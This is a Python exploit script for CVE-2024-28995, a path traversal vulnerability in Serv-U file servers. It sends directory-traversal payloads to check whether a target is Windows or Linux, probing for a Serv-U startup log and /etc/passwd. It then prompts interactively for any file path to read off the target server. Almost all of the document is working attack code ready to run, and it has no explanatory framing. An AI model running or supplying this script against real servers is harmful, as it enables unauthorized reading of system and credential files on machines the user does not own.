import requests
import argparse
import sys
import urllib3
import os
import re

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art

def exploit(targetURL):
    scanWin = "?InternalDir=/../../../../../ProgramData/RhinoSoft/Serv-U&InternalFile=Serv-U-StartupLog.txt"
    scanLin = "?InternalDir=\\..\\..\\..\\..\\..\\etc&InternalFile=passwd"
    
    finalURLWin = targetURL + scanWin
    finalURLLin = targetURL + scanLin
    
    print("\033[92m[+] Checking the target \033[0m")
    
    try:
        # Make the GET request for Windows
        response = requests.get(finalURLWin, verify=False, timeout=10)
        if "Windows Server" in response.text:
            print("\033[92mTarget is vulnerable and is a Windows System!! \033[0m \n")
            getWinFile(targetURL)
            return
        
        # Make the GET request for Linux
        response = requests.get(finalURLLin, verify=False, timeout=10)
        if "root" in response.text:
            print("\033[92mTarget is vulnerable and is a Linux System!! \033[0m \n")
            getLinFile(targetURL)
            return

        print("\033[91mTarget might not be vulnerable...\033[0m")
        
    except Exception as e:
        sys.exit(f"Some error occured: {e}")
        
#Fetching file on Windows Sytems
def getWinFile(targetURL):
    try:
        while True:
            filePathWin = input("\033[92mEnter the path of the file to be extracted(Ex: /windows/win.ini): \033[0m \n")
        
            #Regex to filter the file path and file name for the payload
            pattern = r'^(.*)/([^/]+)$'
            match = re.match(pattern, filePathWin)
            if match:
                file_path = match.group(1)   # Append the path up to the last directory
                file_name = match.group(2)  # Extract the file name
    
            try:
                fetchURLWin = targetURL + f"?InternalDir=/../../../../..{file_path}&InternalFile={file_name}"
                response = requests.get(fetchURLWin, verify=False, timeout=10)
                print(response.text)
    
            except requests.RequestException as e:
                print(f"\033[91m[!] Some error occurred or the file does not exist {e}\033[0m")
                
    except KeyboardInterrupt:
        sys.exit("\n\033[91mOperation Aborted\033[0m")
 
#Fetching file on Linux Sytems   
def getLinFile(targetURL):
    try:
        while True:
            filePathLin = input("\033[92mEnter the path of the file to be extracted(Ex: \etc\passwd): \033[0m \n")
        
            pattern = r'\\(.+?)\\([^\\]+)$'
            match = re.match(pattern, filePathLin)
            if match:
                file_path = match.group(1)   
                file_name = match.group(2) 
            
            try:
                fetchURLLin = targetURL + f"?InternalDir=\\..\\..\\..\\..\\..\\{file_path}&InternalFile={file_name}"
                response = requests.get(fetchURLLin, verify=False, timeout=10)
                print(response.text)
    
            except requests.RequestException as e:
                print(f"\033[91m[!] Some error occurred or the file does not exist {e}\033[0m")
    except KeyboardInterrupt:
        sys.exit("\n\033[91mOperation Aborted\033[0m")
    
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-28995")
    parser.add_argument("-u", '--targetURL', required=True, help="The target URL")
    args = parser.parse_args()
    try:
        ascii()
        return(exploit(args.targetURL))
            
    except Exception as e:
        sys.exit(f"Some error occured: {e}")
        
if __name__ == "__main__":
    main()
